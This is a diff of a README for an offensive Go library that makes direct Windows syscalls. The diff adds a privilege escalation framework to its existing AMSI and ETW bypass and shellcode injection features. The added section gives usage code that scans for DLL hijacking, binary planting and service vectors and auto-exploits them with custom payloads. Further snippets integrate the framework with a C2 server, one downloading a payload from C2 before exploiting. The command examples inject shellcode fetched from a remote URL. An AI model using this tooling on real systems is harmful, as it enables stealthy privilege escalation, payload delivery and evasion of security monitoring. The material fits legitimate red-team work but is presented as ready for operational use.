@@ -28,6 +28,13 @@
   - [DumpAllSyscalls Feature](#dumpalllsyscalls-feature)
 - [Security Bypass Features](#security-bypass-features)
   - [Integration and Usage](#integration-and-usage)
+- [Privilege Escalation Features](#privilege-escalation-features)
+  - [Overview](#overview)
+  - [Discovery Module](#discovery-module-winapi_privescgo)
+  - [Exploitation Module](#exploitation-module-winapi_expgo)
+  - [Integration with Your Projects](#integration-with-your-projects)
+  - [Data Structures](#data-structures)
+  - [Important Usage Notes](#important-usage-notes)
 - [Build Requirements](#build-requirements)
   - [Prerequisites](#prerequisites)
   - [Build Process](#build-process)
@@ -66,8 +73,11 @@
 - **Clean Library Interface**: Simple, easy-to-use functions for any Windows API call
 - **Obfuscation Support**: Function name hashing for stealth operations
 - **Security Bypass**: Built-in AMSI, ETW, and debug protection bypass capabilities  
+- **Privilege Escalation Framework**: Comprehensive discovery and exploitation of Windows privilege escalation vectors
+- **Automated Vulnerability Scanning**: Identifies DLL hijacking, binary planting, and service exploitation opportunities
+- **Structured Exploitation**: Clean library functions for integrating privilege escalation into C2 frameworks
 - **Syscall Table Generation**: Automatic Go source file generation with pre-computed syscall numbers
-- **Comprehensive Constants**: All common Windows constants included
+- **LOTS of Constants**: All common Windows constants included
 - **Type Safety**: Strongly typed function signatures for common APIs
 
 ## Demo
@@ -201,7 +211,7 @@ Enhanced version that enumerates syscalls and exports to both JSON and Go files.
 
 ### NT Status Code Helpers
 
-The library includes comprehensive NT status code formatting and validation functions that are used by default throughout the codebase.
+The library includes NT status code formatting and validation functions that are used by default throughout the codebase.
 
 #### `FormatNTStatus(status uintptr) string`
 Returns a formatted string representation of an NTSTATUS code with both the hex value and human-readable description.
@@ -275,6 +285,10 @@ The library includes a powerful syscall enumeration feature that can discover an
 # Dump all syscalls to console, JSON file and go stub
 # Also demonstrates NT status code formatting examples
 ./go-direct-syscall.exe -dump
+
+# Scan for privilege escalation vectors and test exploitation
+# Also demonstrates privilege escalation framework
+./go-direct-syscall.exe -privesc
 ```
 
 #### Console Output
@@ -686,6 +700,344 @@ func main() {
 **Detection**: While these bypasses use direct syscalls and avoid common hooks, they still modify process memory and may be detected by advanced security solutions.
 
 **Compatibility**: Both functions are designed to fail gracefully. AMSI patch failure is expected when `amsi.dll` isn't loaded. ETW patch failure is rare since `ntdll.dll` is always present.
+
+## Privilege Escalation Features
+
+The library includes a comprehensive privilege escalation framework consisting of two specialized modules: **Discovery** and **Exploitation**. These modules work together to identify and exploit Windows privilege escalation vectors using direct syscalls for stealth and reliability.
+
+### Overview
+
+The privilege escalation framework provides:
+
+- **Automated Discovery**: Scans the system for exploitable privilege escalation vectors
+- **Structured Results**: Returns categorized vulnerabilities with detailed metadata
+- **Multiple Attack Vectors**: Supports DLL hijacking, binary planting, service exploitation, and more
+- **Clean Integration**: Simple library functions ready for C2 framework integration
+- **Silent Operation**: No verbose output, designed for production red team use
+- **Flexible Payloads**: Works with any custom payload or shellcode
+
+### Discovery Module (`winapi_privesc.go`)
+
+The discovery module identifies privilege escalation opportunities across the Windows system.
+
+#### Key Functions
+
+**`ScanPrivilegeEscalationVectors() (PrivEscMap, EscalationSummary, error)`**
+- Comprehensive system scan for privilege escalation vectors
+- Returns structured map of categorized vulnerabilities
+- Includes summary statistics and severity analysis
+
+**`ScanDirectoryPermissions(path string) ([]EscalationVector, error)`**  
+- Analyzes file/directory permissions for weak ACLs
+- Identifies writable system directories
+- Detects DLL hijacking opportunities
+
+**`ScanServicePaths() ([]EscalationVector, error)`**
+- Enumerates Windows services for unquoted path vulnerabilities
+- Identifies service binaries with weak permissions
+- Finds service replacement opportunities
+
+**`ScanRegistryPersistence() ([]EscalationVector, error)`**
+- Scans registry for persistence mechanisms
+- Identifies writable autorun keys
+- Detects service configuration vulnerabilities
+
+#### Usage Example
+
+```go
+package main
+
+import (
+    "fmt"
+    "log"
+    
+    winapi "github.com/carved4/go-direct-syscall"
+)
+
+func main() {
+    // Scan for privilege escalation vectors
+    vectors, summary, err := winapi.ScanPrivilegeEscalationVectors()
+    if err != nil {
+        log.Fatal("Scan failed:", err)
+    }
+    
+    // Display summary
+    fmt.Printf("Found %d high-severity vectors across %d categories\n", 
+        summary.HighSeverityCount, len(vectors))
+    
+    // Process specific attack vectors
+    if dllVectors, exists := vectors["DLL Hijacking"]; exists {
+        fmt.Printf("DLL Hijacking opportunities: %d\n", len(dllVectors))
+        for _, vector := range dllVectors {
+            fmt.Printf("  - %s (Severity: %s)\n", vector.Path, vector.Severity)
+        }
+    }
+    
+    // Check for binary planting opportunities
+    if pathVectors, exists := vectors["Binary Planting"]; exists {
+        fmt.Printf("PATH directories available for hijacking: %d\n", len(pathVectors))
+    }
+}
+```
+
+### Exploitation Module (`winapi_exp.go`)
+
+The exploitation module provides functions to exploit discovered privilege escalation vectors.
+
+#### Key Functions
+
+**`ExploitVectors(vectors PrivEscMap, payload []byte, options ExploitOptions) (ExploitSession, error)`**
+- Universal exploitation interface for all vector types
+- Accepts custom payloads and configuration options
+- Returns detailed exploitation results
+
+**`ExploitDllHijacking(vector EscalationVector, payload []byte) (ExploitResult, error)`**
+- Exploits DLL hijacking vulnerabilities
+- Plants malicious DLL in target directory
+- Supports custom payload injection
+
+**`ExploitBinaryPlanting(vector EscalationVector, payload []byte) (ExploitResult, error)`**
+- Exploits PATH directory hijacking
+- Plants executable in PATH directory
+- Waits for legitimate execution
+
+**`AutoExploit(vectors PrivEscMap, payload []byte) (ExploitSession, error)`**
+- Automatically exploits high-priority vectors
+- Prioritizes most reliable attack methods
+- Provides comprehensive exploitation attempt
+
+#### Usage Example
+
+```go
+package main
+
+import (
+    "fmt"
+    winapi "github.com/carved4/go-direct-syscall"
+)
+
+func main() {
+    // Your custom payload
+    payload := []byte{/* your shellcode or executable */}
+    
+    // Discover vectors
+    vectors, _, err := winapi.ScanPrivilegeEscalationVectors()
+    if err != nil {
+        fmt.Printf("Discovery failed: %v\n", err)
+        return
+    }
+    
+    // Configure exploitation options
+    options := winapi.ExploitOptions{
+        TestMode:     false,  // Set to true for testing without real payloads
+        MaxAttempts:  3,      // Retry failed exploits
+        DelayBetween: 1000,   // Milliseconds between attempts
+    }
+    
+    // Exploit discovered vectors
+    session, err := winapi.ExploitVectors(vectors, payload, options)
+    if err != nil {
+        fmt.Printf("Exploitation failed: %v\n", err)
+        return
+    }
+    
+    // Display results
+    fmt.Printf("Exploitation completed: %d/%d successful\n", 
+        session.SuccessCount, session.TotalAttempts)
+    
+    // Check specific results
+    for method, results := range session.Results {
+        successCount := 0
+        for _, result := range results {
+            if result.Success {
+                successCount++
+            }
+        }
+        fmt.Printf("%s: %d/%d successful\n", method, successCount, len(results))
+    }
+}
+```
+
+### Integration with Your Projects
+
+#### Simple Discovery and Exploitation
+
+```go
+// Basic usag discover and exploit in one function
+func QuickPrivEsc(payload []byte) error {
+    // Discover vectors
+    vectors, summary, err := winapi.ScanPrivilegeEscalationVectors()
+    if err != nil {
+        return err
+    }
+    
+    if summary.HighSeverityCount == 0 {
+        return fmt.Errorf("no high-severity vectors found")
+    }
+    
+    // Auto-exploit high-priority vectors
+    session, err := winapi.AutoExploit(vectors, payload)
+    if err != nil {
+        return err
+    }
+    
+    if session.SuccessCount == 0 {
+        return fmt.Errorf("all exploitation attempts failed")
+    }
+    
+    return nil
+}
+```
+
+#### Advanced C2 Integration
+
+```go
+// C2 Framework integration example
+type C2PrivEsc struct {
+    client     *C2Client
+    discovered bool
+    vectors    winapi.PrivEscMap
+}
+
+func (c *C2PrivEsc) DiscoverVectors() error {
+    vectors, summary, err := winapi.ScanPrivilegeEscalationVectors()
+    if err != nil {
+        return err
+    }
+    
+    c.vectors = vectors
+    c.discovered = true
+    
+    // Report to C2 server
+    c.client.SendReport("privesc_discovery", summary)
+    return nil
+}
+
+func (c *C2PrivEsc) ExploitOnDemand(method string, payload []byte) error {
+    if !c.discovered {
+        return fmt.Errorf("must discover vectors first")
+    }
+    
+    // Exploit specific method
+    if vectors, exists := c.vectors[method]; exists {
+        for _, vector := range vectors {
+            result, err := c.exploitVector(vector, payload)
+            if err == nil && result.Success {
+                c.client.SendSuccess("privesc_exploit", result)
+                return nil
+            }
+        }
+    }
+    
+    return fmt.Errorf("exploitation failed for method: %s", method)
+}
+```
+
+#### Red Team Automation
+
+```go
+// Automated red team workflow
+func AutomatedPrivEsc() {
+    // Step 1: Reconnaissance  
+    vectors, summary, err := winapi.ScanPrivilegeEscalationVectors()
+    if err != nil {
+        log.Printf("[!] Discovery failed: %v", err)
+        return
+    }
+    
+    log.Printf("[+] Discovered %d vectors across %d categories", 
+        summary.TotalVectors, len(vectors))
+    
+    // Step 2: Download payload from C2
+    payload, err := downloadFromC2("latest_payload")
+    if err != nil {
+        log.Printf("[!] Payload download failed: %v", err)
+        return
+    }
+    
+    // Step 3: Exploitation with preference order
+    preferredMethods := []string{
+        "Binary Planting",      // Most reliable
+        "DLL Hijacking",        // High success rate  
+        "Task Scheduler",       // Good persistence
+        "Service Replacement",  // System-level access
+    }
+    
+    for _, method := range preferredMethods {
+        if exploitMethod(vectors, method, payload) {
+            log.Printf("[+] Successfully exploited via %s", method)
+            reportSuccess(method)
+            return
+        }
+    }
+    
+    log.Printf("[!] All exploitation methods failed")
+}
+```
+
+### Data Structures
+
+#### EscalationVector
+Represents a single privilege escalation opportunity:
+
+```go
+type EscalationVector struct {
+    Type        string    // "DLL Hijacking", "Binary Planting", etc.
+    Path        string    // Target file/directory path
+    Severity    string    // "High", "Medium", "Low"  
+    Description string    // Human-readable description
+    Method      string    // Specific exploitation method
+    Metadata    map[string]interface{} // Additional context
+}
+```
+
+#### PrivEscMap
+Categorized map of privilege escalation vectors:
+
+```go
+type PrivEscMap map[string][]EscalationVector
+// Categories: "DLL Hijacking", "Binary Planting", "Task Scheduler", etc.
+```
+
+#### ExploitResult
+Result of a single exploitation attempt:
+
+```go
+type ExploitResult struct {
+    Success     bool      // Whether exploitation succeeded
+    Vector      EscalationVector // Original vector that was exploited
+    Method      string    // Exploitation method used
+    Error       string    // Error message if failed
+    Timestamp   time.Time // When exploitation was attempted
+    PayloadPath string    // Where payload was planted
+}
+```
+
+### Important Usage Notes
+
+#### Testing vs Production
+- **Test Mode**: Use `ExploitOptions{TestMode: true}` to validate vectors without deploying real payloads
+- **Production Mode**: Set `TestMode: false` for actual exploitation with your payloads
+
+#### Payload Requirements
+- **DLL Hijacking**: Requires DLL payloads (compiled .dll files)
+- **Binary Planting**: Requires executable payloads (.exe files)  
+- **Task Scheduler**: Works with any executable format
+- **Service Replacement**: Requires service-compatible executables
+
+#### Operational Security
+- All operations use direct syscalls for stealth
+- No verbose logging in production mode
+- Automatic cleanup of failed exploitation attempts
+- Structured results prevent information leakage
+
+#### Error Handling
+- Functions return detailed error information
+- Graceful handling of access denied scenarios
+- Continues operation even if some vectors fail
+- Comprehensive logging available in debug mode
+
+This privilege escalation framework provides enterprise-grade capabilities for red team operations
 
 ## Build Requirements
 
@@ -1133,6 +1485,9 @@ func main() {
 
 # Remote injection into another process (shows process selection menu)
 ./go-direct-syscall.exe -url https://your-server.com/payload.bin
+
+# Scan for privilege escalation vectors (safe mode - no files created)
+./go-direct-syscall.exe -privesc
 ```
 
 **What NtInjectSelfShellcode Does:**
@@ -1464,7 +1819,7 @@ if status == winapi.STATUS_SUCCESS {
 
 ### Validation & Error Handling
 
-#### **Comprehensive NT Status Integration**
+#### **NT Status Integration**
 - **Smart Validation Thresholds**: Only warns for truly suspicious syscall numbers (0-1)
 - **Contextual Warnings**: Differentiates between normal low numbers and actual issues
 - **False Positive Reduction**: No more warnings for common functions like `NtClose(15)`
@@ -1577,11 +1932,11 @@ The command-line tool automatically calls `SelfDel()` after successful operation
 ./go-direct-syscall.exe -url https://server.com/payload.bin -self
 ```
 
-**Note**: The `-dump` option does not trigger self-deletion as it's used for research purposes.
+**Note**: The `-dump` and `-privesc` options do not trigger self-deletion as they are used for research purposes.
 
 #### **Error Handling**
 
-`SelfDel()` includes comprehensive error handling with descriptive NT status messages:
+`SelfDel()` includes error handling with descriptive NT status messages:
 
 - `STATUS_OBJECT_NAME_INVALID` - Path format issues (automatically uses NT format)
 - `STATUS_OBJECT_PATH_SYNTAX_BAD` - Win32 path rejected (fallback to NT path)
@@ -1624,6 +1979,9 @@ bash build.sh
 # Dump all syscalls (no injection, safe for analysis)
 ./go-direct-syscall.exe -dump
 
+# Scan for privilege escalation vectors (no files created)
+./go-direct-syscall.exe -privesc
+
 # Self-injection with embedded calc shellcode (default for -example)
 ./go-direct-syscall.exe -example 
 
@@ -1632,6 +1990,9 @@ bash build.sh
 
 # Remote injection with custom payload (shows process selection)
 ./go-direct-syscall.exe -url http://example.com/payload.bin
+
+# Enable debug logging for any operation
+./go-direct-syscall.exe -debug -privesc
 
 # The embedded shellcode is a simple calc.exe payload - replace GetEmbeddedShellcode() 
 # function with your own shellcode generated via donut, msfvenom, etc.
@@ -1648,7 +2009,7 @@ Contributions are welcome! Please feel free to:
 
 - Add more Windows API function wrappers
 - Improve error handling
-- Add more comprehensive examples
+- Add more examples
 - Optimize performance
 - Add support for additional architectures
 
